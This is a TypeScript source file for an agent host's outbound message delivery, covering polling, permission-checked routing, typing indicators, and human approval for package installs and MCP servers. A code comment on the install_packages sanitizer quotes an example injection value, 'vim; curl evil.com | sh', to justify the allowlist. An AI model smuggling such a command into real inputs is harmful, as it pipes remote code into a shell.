/**
 * Outbound message delivery.
 * Polls session outbound DBs for undelivered messages, delivers through channel adapters.
 *
 * Two-DB architecture:
 *   - Reads messages_out from outbound.db (container-owned, opened read-only)
 *   - Tracks delivery in inbound.db's `delivered` table (host-owned)
 *   - Never writes to outbound.db — preserves single-writer-per-file invariant
 */
import type Database from 'better-sqlite3';
import fs from 'fs';
import path from 'path';

import { GROUPS_DIR } from './config.js';
import {
  getRunningSessions,
  getActiveSessions,
  createPendingQuestion,
  getSession,
  createPendingApproval,
} from './db/sessions.js';
import { getAgentGroup, createAgentGroup, getAgentGroupByFolder } from './db/agent-groups.js';
import { createDestination, getDestinationByName, hasDestination, normalizeName } from './db/agent-destinations.js';
import { getMessagingGroup, getMessagingGroupByPlatform } from './db/messaging-groups.js';
import { pickApprovalDelivery, pickApprover } from './access.js';
import {
  getDueOutboundMessages,
  getDeliveredIds,
  markDelivered,
  markDeliveryFailed,
  migrateDeliveredTable,
} from './db/session-db.js';
import { insertTask, cancelTask, pauseTask, resumeTask, updateTask } from './modules/scheduling/db.js';
import { log } from './log.js';
import { normalizeOptions, type RawOption } from './channels/ask-question.js';
import {
  heartbeatPath,
  openInboundDb,
  openOutboundDb,
  sessionDir,
  resolveSession,
  writeDestinations,
  writeSessionMessage,
} from './session-manager.js';
import { resetContainerIdleTimer, wakeContainer } from './container-runner.js';
import { initGroupFilesystem } from './group-init.js';
import type { OutboundFile } from './channels/adapter.js';
import type { AgentGroup, Session } from './types.js';

const ACTIVE_POLL_MS = 1000;
const SWEEP_POLL_MS = 60_000;
const MAX_DELIVERY_ATTEMPTS = 3;

/** Track delivery attempt counts. Resets on process restart (gives failed messages a fresh chance). */
const deliveryAttempts = new Map<string, number>();

/**
 * Sessions whose outbound queue is currently being drained.
 *
 * The active poll (1s, running sessions) and the sweep poll (60s, all
 * active sessions) both call deliverSessionMessages, and a running session
 * is in *both* result sets. Without this guard, the two timer chains can
 * race on the same outbound row: both read it as undelivered, both call
 * the channel adapter, both markDelivered (idempotent in the DB via
 * INSERT OR IGNORE — but the user has already seen the message twice).
 *
 * Skipping (vs. queueing) is correct: any message left over when the
 * second caller skips will be picked up on the next poll tick (~1s).
 */
const inflightDeliveries = new Set<string>();

export interface ChannelDeliveryAdapter {
  deliver(
    channelType: string,
    platformId: string,
    threadId: string | null,
    kind: string,
    content: string,
    files?: OutboundFile[],
  ): Promise<string | undefined>;
  setTyping?(channelType: string, platformId: string, threadId: string | null): Promise<void>;
}

let deliveryAdapter: ChannelDeliveryAdapter | null = null;
let activePolling = false;
let sweepPolling = false;

export function setDeliveryAdapter(adapter: ChannelDeliveryAdapter): void {
  deliveryAdapter = adapter;
}

/**
 * Deliver a system notification to an agent as a regular chat message.
 * Used for fire-and-forget responses from host actions (create_agent result,
 * approval outcomes, etc.). The agent sees it as an inbound chat message
 * with sender="system".
 */
function notifyAgent(session: Session, text: string): void {
  writeSessionMessage(session.agent_group_id, session.id, {
    id: `sys-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    kind: 'chat',
    timestamp: new Date().toISOString(),
    platformId: session.agent_group_id,
    channelType: 'agent',
    threadId: null,
    content: JSON.stringify({ text, sender: 'system', senderId: 'system' }),
  });
  // Wake the container so it picks up the notification promptly
  const fresh = getSession(session.id);
  if (fresh) {
    wakeContainer(fresh).catch((err) => log.error('Failed to wake container after notification', { err }));
  }
}

/**
 * Send an approval request to a privileged user's DM and record a
 * pending_approval row. Routing: admin @ originating agent group → owner.
 * Tie-break: prefer an approver reachable on the same channel kind as the
 * originating session's messaging group. Delivery always lands in the
 * approver's DM (not the origin group), regardless of where the action
 * was triggered.
 */
const APPROVAL_OPTIONS: RawOption[] = [
  { label: 'Approve', selectedLabel: '✅ Approved', value: 'approve' },
  { label: 'Reject', selectedLabel: '❌ Rejected', value: 'reject' },
];

async function requestApproval(
  session: Session,
  agentName: string,
  action: 'install_packages' | 'request_rebuild' | 'add_mcp_server',
  payload: Record<string, unknown>,
  title: string,
  question: string,
): Promise<void> {
  const approvers = pickApprover(session.agent_group_id);
  if (approvers.length === 0) {
    notifyAgent(session, `${action} failed: no owner or admin configured to approve.`);
    return;
  }

  // Origin channel kind drives the tie-break preference in approval delivery.
  const originChannelType = session.messaging_group_id
    ? (getMessagingGroup(session.messaging_group_id)?.channel_type ?? '')
    : '';

  const target = await pickApprovalDelivery(approvers, originChannelType);
  if (!target) {
    notifyAgent(session, `${action} failed: no DM channel found for any eligible approver.`);
    return;
  }

  const approvalId = `appr-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const normalizedOptions = normalizeOptions(APPROVAL_OPTIONS);
  createPendingApproval({
    approval_id: approvalId,
    session_id: session.id,
    request_id: approvalId, // fire-and-forget: no separate request id to correlate
    action,
    payload: JSON.stringify(payload),
    created_at: new Date().toISOString(),
    title,
    options_json: JSON.stringify(normalizedOptions),
  });

  if (deliveryAdapter) {
    try {
      await deliveryAdapter.deliver(
        target.messagingGroup.channel_type,
        target.messagingGroup.platform_id,
        null,
        'chat-sdk',
        JSON.stringify({
          type: 'ask_question',
          questionId: approvalId,
          title,
          question,
          options: APPROVAL_OPTIONS,
        }),
      );
    } catch (err) {
      log.error('Failed to deliver approval card', { action, approvalId, err });
      notifyAgent(session, `${action} failed: could not deliver approval request to ${target.userId}.`);
      return;
    }
  }

  log.info('Approval requested', { action, approvalId, agentName, approver: target.userId });
}

/** Show typing indicator on a channel. Called when a message is routed to the agent. */
export async function triggerTyping(channelType: string, platformId: string, threadId: string | null): Promise<void> {
  try {
    await deliveryAdapter?.setTyping?.(channelType, platformId, threadId);
  } catch {
    // Typing is best-effort — don't fail routing if it errors
  }
}

// ── Typing refresh ──
// Most platforms expire a typing indicator after 5–10s, so a one-shot call
// on message arrival goes stale long before the agent finishes thinking.
// We keep it alive by re-firing setTyping on a short interval — but only
// while the agent is actually WORKING, not just while the container is
// alive. The agent-runner touches `heartbeat` on every SDK event, so we
// gate each tick on "is the heartbeat file fresh?". If it goes stale (agent
// finished its turn and is idle-polling), the refresh stops on its own
// without waiting for the container to exit.
//
// After delivering a user-facing message, the refresh is paused for
// POST_DELIVERY_PAUSE_MS — long enough for the client-side typing
// indicator to visually clear (Discord ~10s, Telegram ~5s). If the agent
// keeps touching heartbeat past the pause window, typing resumes
// naturally on the next refresh tick.
//
// `startTypingRefresh` is idempotent per session. `stopTypingRefresh` is
// called from container-runner.ts on container exit as a fast-path cleanup
// (the heartbeat-staleness path would catch it within one tick anyway).
const TYPING_REFRESH_MS = 4000;
// Grace window from startTypingRefresh: fire typing unconditionally for
// this long regardless of heartbeat state. Covers container spawn/wake
// latency, which can be 5–12s on a cold start before the first heartbeat
// touch lands.
const TYPING_GRACE_MS = 15000;
// After the grace window, a heartbeat must be mtimed within this many
// milliseconds of now to count as "agent is working." Heartbeats are
// touched on every SDK event (tool calls, result chunks), so during
// active work they land every few hundred ms. 6s is well above that
// while still being small enough to stop typing quickly when the agent
// goes idle.
const HEARTBEAT_FRESH_MS = 6000;
// After we deliver a user-facing message, pause typing for this long so
// the client-side indicator has time to visually clear. Tuned for the
// longest common client expiry (Discord ~10s). The interval stays
// running; ticks inside the pause just skip the setTyping call.
const POST_DELIVERY_PAUSE_MS = 10000;

interface TypingTarget {
  agentGroupId: string;
  channelType: string;
  platformId: string;
  threadId: string | null;
  interval: NodeJS.Timeout;
  startedAt: number;
  pausedUntil: number; // epoch ms; 0 = not paused
}

const typingRefreshers = new Map<string, TypingTarget>();

function isHeartbeatFresh(agentGroupId: string, sessionId: string): boolean {
  const hbPath = heartbeatPath(agentGroupId, sessionId);
  try {
    const stat = fs.statSync(hbPath);
    return Date.now() - stat.mtimeMs < HEARTBEAT_FRESH_MS;
  } catch {
    return false;
  }
}

export function startTypingRefresh(
  sessionId: string,
  agentGroupId: string,
  channelType: string,
  platformId: string,
  threadId: string | null,
): void {
  const existing = typingRefreshers.get(sessionId);
  if (existing) {
    // Already refreshing. Fire an immediate tick for the new inbound
    // event and reset the grace window — the new message restarts the
    // container-wake latency budget. Also clear any lingering
    // post-delivery pause: a new inbound means the user expects typing
    // to show immediately.
    triggerTyping(channelType, platformId, threadId).catch(() => {});
    existing.startedAt = Date.now();
    existing.pausedUntil = 0;
    return;
  }

  // Immediate tick + periodic refresh.
  triggerTyping(channelType, platformId, threadId).catch(() => {});
  const startedAt = Date.now();
  const interval = setInterval(() => {
    const entry = typingRefreshers.get(sessionId);
    if (!entry) return; // stopped externally since this tick was scheduled

    // Inside a post-delivery pause: skip setTyping but keep the interval
    // running so we resume automatically once the pause expires.
    if (entry.pausedUntil > Date.now()) return;

    const withinGrace = Date.now() - entry.startedAt < TYPING_GRACE_MS;
    if (withinGrace || isHeartbeatFresh(entry.agentGroupId, sessionId)) {
      triggerTyping(entry.channelType, entry.platformId, entry.threadId).catch(() => {});
      return;
    }

    // Out of grace AND heartbeat stale — agent is idle, stop refreshing.
    clearInterval(entry.interval);
    typingRefreshers.delete(sessionId);
  }, TYPING_REFRESH_MS);
  // unref so a stale refresher can't hold the event loop alive.
  interval.unref();
  typingRefreshers.set(sessionId, {
    agentGroupId,
    channelType,
    platformId,
    threadId,
    interval,
    startedAt,
    pausedUntil: 0,
  });
}

/**
 * Pause the typing refresh for POST_DELIVERY_PAUSE_MS. Called after a
 * user-facing message is delivered so the client-side indicator has a
 * chance to visually clear before the agent's next SDK event pushes it
 * back on. No-op if no refresh is active for this session.
 */
export function pauseTypingRefreshAfterDelivery(sessionId: string): void {
  const entry = typingRefreshers.get(sessionId);
  if (!entry) return;
  entry.pausedUntil = Date.now() + POST_DELIVERY_PAUSE_MS;
}

export function stopTypingRefresh(sessionId: string): void {
  const entry = typingRefreshers.get(sessionId);
  if (!entry) return;
  clearInterval(entry.interval);
  typingRefreshers.delete(sessionId);
}

/** Start the active container poll loop (~1s). */
export function startActiveDeliveryPoll(): void {
  if (activePolling) return;
  activePolling = true;
  pollActive();
}

/** Start the sweep poll loop (~60s). */
export function startSweepDeliveryPoll(): void {
  if (sweepPolling) return;
  sweepPolling = true;
  pollSweep();
}

async function pollActive(): Promise<void> {
  if (!activePolling) return;

  try {
    const sessions = getRunningSessions();
    for (const session of sessions) {
      await deliverSessionMessages(session);
    }
  } catch (err) {
    log.error('Active delivery poll error', { err });
  }

  setTimeout(pollActive, ACTIVE_POLL_MS);
}

async function pollSweep(): Promise<void> {
  if (!sweepPolling) return;

  try {
    const sessions = getActiveSessions();
    for (const session of sessions) {
      await deliverSessionMessages(session);
    }
  } catch (err) {
    log.error('Sweep delivery poll error', { err });
  }

  setTimeout(pollSweep, SWEEP_POLL_MS);
}

export async function deliverSessionMessages(session: Session): Promise<void> {
  // Reject re-entry from a concurrent poll on the same session — see the
  // comment on inflightDeliveries above.
  if (inflightDeliveries.has(session.id)) return;
  inflightDeliveries.add(session.id);

  try {
    await drainSession(session);
  } finally {
    inflightDeliveries.delete(session.id);
  }
}

async function drainSession(session: Session): Promise<void> {
  const agentGroup = getAgentGroup(session.agent_group_id);
  if (!agentGroup) return;

  let outDb: Database.Database;
  let inDb: Database.Database;
  try {
    outDb = openOutboundDb(agentGroup.id, session.id);
    inDb = openInboundDb(agentGroup.id, session.id);
  } catch {
    return; // DBs might not exist yet
  }

  try {
    // Read all due messages from outbound.db (read-only)
    const allDue = getDueOutboundMessages(outDb);
    if (allDue.length === 0) return;

    // Filter out already-delivered messages using inbound.db's delivered table
    const delivered = getDeliveredIds(inDb);
    const undelivered = allDue.filter((m) => !delivered.has(m.id));
    if (undelivered.length === 0) return;

    // Ensure platform_message_id column exists (migration for existing sessions)
    migrateDeliveredTable(inDb);

    for (const msg of undelivered) {
      try {
        const platformMsgId = await deliverMessage(msg, session, inDb);
        markDelivered(inDb, msg.id, platformMsgId ?? null);
        deliveryAttempts.delete(msg.id);
        resetContainerIdleTimer(session.id);

        // Pause the typing indicator after a real user-facing message
        // lands on the user's screen, so the client has time to visually
        // clear the indicator before the next heartbeat tick brings it
        // back. Skip the pause for internal traffic (system actions,
        // agent-to-agent routing) — the user doesn't see those and
        // shouldn't get a gap in their typing indicator for them.
        if (msg.kind !== 'system' && msg.channel_type !== 'agent') {
          pauseTypingRefreshAfterDelivery(session.id);
        }
      } catch (err) {
        const attempts = (deliveryAttempts.get(msg.id) ?? 0) + 1;
        deliveryAttempts.set(msg.id, attempts);
        if (attempts >= MAX_DELIVERY_ATTEMPTS) {
          log.error('Message delivery failed permanently, giving up', {
            messageId: msg.id,
            sessionId: session.id,
            attempts,
            err,
          });
          markDeliveryFailed(inDb, msg.id);
          deliveryAttempts.delete(msg.id);
        } else {
          log.warn('Message delivery failed, will retry', {
            messageId: msg.id,
            sessionId: session.id,
            attempt: attempts,
            maxAttempts: MAX_DELIVERY_ATTEMPTS,
            err,
          });
        }
      }
    }
  } finally {
    outDb.close();
    inDb.close();
  }
}

async function deliverMessage(
  msg: {
    id: string;
    kind: string;
    platform_id: string | null;
    channel_type: string | null;
    thread_id: string | null;
    content: string;
  },
  session: Session,
  inDb: Database.Database,
): Promise<string | undefined> {
  if (!deliveryAdapter) {
    log.warn('No delivery adapter configured, dropping message', { id: msg.id });
    return;
  }

  const content = JSON.parse(msg.content);

  // System actions — handle internally (schedule_task, cancel_task, etc.)
  if (msg.kind === 'system') {
    await handleSystemAction(content, session, inDb);
    return;
  }

  // Agent-to-agent — route to target session (with permission check).
  // Permission is enforced via agent_destinations — the source agent must have
  // a row for the target. Content is copied verbatim; the target's formatter
  // will look up the source agent in its own local map to display a name.
  if (msg.channel_type === 'agent') {
    const targetAgentGroupId = msg.platform_id;
    if (!targetAgentGroupId) {
      throw new Error(`agent-to-agent message ${msg.id} is missing a target agent group id`);
    }
    // Self-messages are always allowed — used for system notes injected back
    // into an agent's own session (e.g. post-approval follow-up prompts).
    if (
      targetAgentGroupId !== session.agent_group_id &&
      !hasDestination(session.agent_group_id, 'agent', targetAgentGroupId)
    ) {
      throw new Error(
        `unauthorized agent-to-agent: ${session.agent_group_id} has no destination for ${targetAgentGroupId}`,
      );
    }
    if (!getAgentGroup(targetAgentGroupId)) {
      throw new Error(`target agent group ${targetAgentGroupId} not found for message ${msg.id}`);
    }
    const { session: targetSession } = resolveSession(targetAgentGroupId, null, null, 'agent-shared');
    writeSessionMessage(targetAgentGroupId, targetSession.id, {
      id: `a2a-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      kind: 'chat',
      timestamp: new Date().toISOString(),
      platformId: session.agent_group_id,
      channelType: 'agent',
      threadId: null,
      content: msg.content,
    });
    log.info('Agent message routed', {
      from: session.agent_group_id,
      to: targetAgentGroupId,
      targetSession: targetSession.id,
    });
    const fresh = getSession(targetSession.id);
    if (fresh) await wakeContainer(fresh);
    return;
  }

  // Permission check: the source agent must be allowed to deliver to this
  // channel destination. Two ways it passes:
  //
  //   1. The target is the session's own origin chat (session.messaging_group_id
  //      matches). An agent can always reply to the chat it was spawned from;
  //      requiring a destinations row for the obvious case is a footgun.
  //
  //   2. Otherwise, the agent must have an explicit agent_destinations row
  //      targeting that messaging group. createMessagingGroupAgent() inserts
  //      these automatically when wiring, so an operator wiring additional
  //      chats to the agent doesn't need a separate ACL step.
  //
  // Failures throw — unlike a silent `return`, an Error falls into the retry
  // path in deliverSessionMessages and eventually marks the message as failed
  // (instead of marking it delivered when nothing was actually delivered,
  // which was the pre-refactor bug).
  if (msg.channel_type && msg.platform_id) {
    const mg = getMessagingGroupByPlatform(msg.channel_type, msg.platform_id);
    if (!mg) {
      throw new Error(`unknown messaging group for ${msg.channel_type}/${msg.platform_id} (message ${msg.id})`);
    }
    const isOriginChat = session.messaging_group_id === mg.id;
    if (!isOriginChat && !hasDestination(session.agent_group_id, 'channel', mg.id)) {
      throw new Error(
        `unauthorized channel destination: ${session.agent_group_id} cannot send to ${mg.channel_type}/${mg.platform_id}`,
      );
    }
  }

  // Track pending questions for ask_user_question flow
  if (content.type === 'ask_question' && content.questionId) {
    const title = content.title as string | undefined;
    const rawOptions = content.options as unknown;
    if (!title || !Array.isArray(rawOptions)) {
      log.error('ask_question missing required title/options — not persisting', {
        questionId: content.questionId,
      });
    } else {
      createPendingQuestion({
        question_id: content.questionId,
        session_id: session.id,
        message_out_id: msg.id,
        platform_id: msg.platform_id,
        channel_type: msg.channel_type,
        thread_id: msg.thread_id,
        title,
        options: normalizeOptions(rawOptions as never),
        created_at: new Date().toISOString(),
      });
      log.info('Pending question created', { questionId: content.questionId, sessionId: session.id });
    }
  }

  // Channel delivery
  if (!msg.channel_type || !msg.platform_id) {
    log.warn('Message missing routing fields', { id: msg.id });
    return;
  }

  // Read file attachments from outbox if the content declares files
  let files: OutboundFile[] | undefined;
  const outboxDir = path.join(sessionDir(session.agent_group_id, session.id), 'outbox', msg.id);
  if (Array.isArray(content.files) && content.files.length > 0 && fs.existsSync(outboxDir)) {
    files = [];
    for (const filename of content.files as string[]) {
      const filePath = path.join(outboxDir, filename);
      if (fs.existsSync(filePath)) {
        files.push({ filename, data: fs.readFileSync(filePath) });
      } else {
        log.warn('Outbox file not found', { messageId: msg.id, filename });
      }
    }
    if (files.length === 0) files = undefined;
  }

  const platformMsgId = await deliveryAdapter.deliver(
    msg.channel_type,
    msg.platform_id,
    msg.thread_id,
    msg.kind,
    msg.content,
    files,
  );
  log.info('Message delivered', {
    id: msg.id,
    channelType: msg.channel_type,
    platformId: msg.platform_id,
    platformMsgId,
    fileCount: files?.length,
  });

  // Clean up outbox best-effort — the message is already on the user's
  // screen, so a cleanup failure must NOT propagate. If it did, the
  // caller would treat the whole delivery as failed, retry on the next
  // poll, and the user would see the message twice.
  if (fs.existsSync(outboxDir)) {
    try {
      fs.rmSync(outboxDir, { recursive: true, force: true });
    } catch (err) {
      log.warn('Outbox cleanup failed (message already delivered)', { messageId: msg.id, err });
    }
  }

  return platformMsgId;
}

/**
 * Handle system actions from the container agent.
 * These are written to messages_out because the container can't write to inbound.db.
 * The host applies them to inbound.db here.
 */
async function handleSystemAction(
  content: Record<string, unknown>,
  session: Session,
  inDb: Database.Database,
): Promise<void> {
  const action = content.action as string;
  log.info('System action from agent', { sessionId: session.id, action });

  switch (action) {
    case 'schedule_task': {
      const taskId = content.taskId as string;
      const prompt = content.prompt as string;
      const script = content.script as string | null;
      const processAfter = content.processAfter as string;
      const recurrence = (content.recurrence as string) || null;

      insertTask(inDb, {
        id: taskId,
        processAfter,
        recurrence,
        platformId: (content.platformId as string) ?? null,
        channelType: (content.channelType as string) ?? null,
        threadId: (content.threadId as string) ?? null,
        content: JSON.stringify({ prompt, script }),
      });
      log.info('Scheduled task created', { taskId, processAfter, recurrence });
      break;
    }

    case 'cancel_task': {
      const taskId = content.taskId as string;
      cancelTask(inDb, taskId);
      log.info('Task cancelled', { taskId });
      break;
    }

    case 'pause_task': {
      const taskId = content.taskId as string;
      pauseTask(inDb, taskId);
      log.info('Task paused', { taskId });
      break;
    }

    case 'resume_task': {
      const taskId = content.taskId as string;
      resumeTask(inDb, taskId);
      log.info('Task resumed', { taskId });
      break;
    }

    case 'update_task': {
      const taskId = content.taskId as string;
      const update: Parameters<typeof updateTask>[2] = {};
      if (typeof content.prompt === 'string') update.prompt = content.prompt;
      if (typeof content.processAfter === 'string') update.processAfter = content.processAfter;
      if (content.recurrence === null || typeof content.recurrence === 'string') {
        update.recurrence = content.recurrence as string | null;
      }
      if (content.script === null || typeof content.script === 'string') {
        update.script = content.script as string | null;
      }
      const touched = updateTask(inDb, taskId, update);
      log.info('Task updated', { taskId, touched, fields: Object.keys(update) });
      if (touched === 0) {
        notifyAgent(session, `update_task: no live task matched id "${taskId}".`);
      }
      break;
    }

    case 'create_agent': {
      const requestId = content.requestId as string;
      const name = content.name as string;
      const instructions = content.instructions as string | null;

      const sourceGroup = getAgentGroup(session.agent_group_id);
      if (!sourceGroup) {
        notifyAgent(session, `create_agent failed: source agent group not found.`);
        log.warn('create_agent failed: missing source group', { sessionAgentGroup: session.agent_group_id, name });
        break;
      }

      const localName = normalizeName(name);

      // Collision in the creator's destination namespace
      if (getDestinationByName(sourceGroup.id, localName)) {
        notifyAgent(session, `Cannot create agent "${name}": you already have a destination named "${localName}".`);
        break;
      }

      // Derive a safe folder name, deduplicated globally across agent_groups.folder
      let folder = localName;
      let suffix = 2;
      while (getAgentGroupByFolder(folder)) {
        folder = `${localName}-${suffix}`;
        suffix++;
      }

      const groupPath = path.join(GROUPS_DIR, folder);
      const resolvedPath = path.resolve(groupPath);
      const resolvedGroupsDir = path.resolve(GROUPS_DIR);
      if (!resolvedPath.startsWith(resolvedGroupsDir + path.sep)) {
        notifyAgent(session, `Cannot create agent "${name}": invalid folder path.`);
        log.error('create_agent path traversal attempt', { folder, resolvedPath });
        break;
      }

      const agentGroupId = `ag-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
      const now = new Date().toISOString();

      const newGroup: AgentGroup = {
        id: agentGroupId,
        name,
        folder,
        agent_provider: null,
        created_at: now,
      };
      createAgentGroup(newGroup);
      initGroupFilesystem(newGroup, { instructions: instructions ?? undefined });

      // Insert bidirectional destination rows (= ACL grants).
      // Creator refers to child by the name it chose; child refers to creator as "parent".
      createDestination({
        agent_group_id: sourceGroup.id,
        local_name: localName,
        target_type: 'agent',
        target_id: agentGroupId,
        created_at: now,
      });
      // Handle the unlikely case where the child already has a "parent" destination
      // (shouldn't happen for a brand-new agent, but be safe).
      let parentName = 'parent';
      let parentSuffix = 2;
      while (getDestinationByName(agentGroupId, parentName)) {
        parentName = `parent-${parentSuffix}`;
        parentSuffix++;
      }
      createDestination({
        agent_group_id: agentGroupId,
        local_name: parentName,
        target_type: 'agent',
        target_id: sourceGroup.id,
        created_at: now,
      });

      // REQUIRED: project the new destination into the running
      // container's inbound.db. See the top-of-file invariant in
      // src/db/agent-destinations.ts — forgetting this causes
      // "dropped: unknown destination" when the parent tries to send
      // to the newly-created child.
      writeDestinations(session.agent_group_id, session.id);

      // Fire-and-forget notification back to the creator
      notifyAgent(
        session,
        `Agent "${localName}" created. You can now message it with <message to="${localName}">...</message>.`,
      );
      log.info('Agent group created', { agentGroupId, name, localName, folder, parent: sourceGroup.id });
      // Note: requestId is unused — this is fire-and-forget, not request/response.
      void requestId;
      break;
    }

    case 'add_mcp_server': {
      const agentGroup = getAgentGroup(session.agent_group_id);
      if (!agentGroup) {
        notifyAgent(session, 'add_mcp_server failed: agent group not found.');
        break;
      }
      const serverName = content.name as string;
      const command = content.command as string;
      if (!serverName || !command) {
        notifyAgent(session, 'add_mcp_server failed: name and command are required.');
        break;
      }
      await requestApproval(
        session,
        agentGroup.name,
        'add_mcp_server',
        {
          name: serverName,
          command,
          args: (content.args as string[]) || [],
          env: (content.env as Record<string, string>) || {},
        },
        'Add MCP Request',
        `Agent "${agentGroup.name}" is attempting to add a new MCP server:\n${serverName} (${command})`,
      );
      break;
    }

    case 'install_packages': {
      const agentGroup = getAgentGroup(session.agent_group_id);
      if (!agentGroup) {
        notifyAgent(session, 'install_packages failed: agent group not found.');
        break;
      }

      const apt = (content.apt as string[]) || [];
      const npm = (content.npm as string[]) || [];
      const reason = (content.reason as string) || '';

      // Host-side sanitization (defense in depth — container should validate first).
      // Strict allowlist: Debian/npm naming rules only. Blocks shell injection via
      // package names like `vim; curl evil.com | sh`.
      const APT_RE = /^[a-z0-9][a-z0-9._+-]*$/;
      const NPM_RE = /^(@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*$/;
      const MAX_PACKAGES = 20;
      if (apt.length + npm.length === 0) {
        notifyAgent(session, 'install_packages failed: at least one apt or npm package is required.');
        break;
      }
      if (apt.length + npm.length > MAX_PACKAGES) {
        notifyAgent(session, `install_packages failed: max ${MAX_PACKAGES} packages per request.`);
        break;
      }
      const invalidApt = apt.find((p) => !APT_RE.test(p));
      if (invalidApt) {
        notifyAgent(session, `install_packages failed: invalid apt package name "${invalidApt}".`);
        log.warn('install_packages: invalid apt package rejected', { pkg: invalidApt });
        break;
      }
      const invalidNpm = npm.find((p) => !NPM_RE.test(p));
      if (invalidNpm) {
        notifyAgent(session, `install_packages failed: invalid npm package name "${invalidNpm}".`);
        log.warn('install_packages: invalid npm package rejected', { pkg: invalidNpm });
        break;
      }

      const packageList = [...apt.map((p) => `apt: ${p}`), ...npm.map((p) => `npm: ${p}`)].join(', ');
      await requestApproval(
        session,
        agentGroup.name,
        'install_packages',
        { apt, npm, reason },
        'Install Packages Request',
        `Agent "${agentGroup.name}" is attempting to install a package + rebuild container:\n${packageList}${reason ? `\nReason: ${reason}` : ''}`,
      );
      break;
    }

    case 'request_rebuild': {
      const agentGroup = getAgentGroup(session.agent_group_id);
      if (!agentGroup) {
        notifyAgent(session, 'request_rebuild failed: agent group not found.');
        break;
      }
      const reason = (content.reason as string) || '';
      await requestApproval(
        session,
        agentGroup.name,
        'request_rebuild',
        { reason },
        'Rebuild Request',
        `Agent "${agentGroup.name}" is attempting to rebuild container.${reason ? `\nReason: ${reason}` : ''}`,
      );
      break;
    }

    default:
      log.warn('Unknown system action', { action });
  }
}

export function stopDeliveryPolls(): void {
  activePolling = false;
  sweepPolling = false;
}
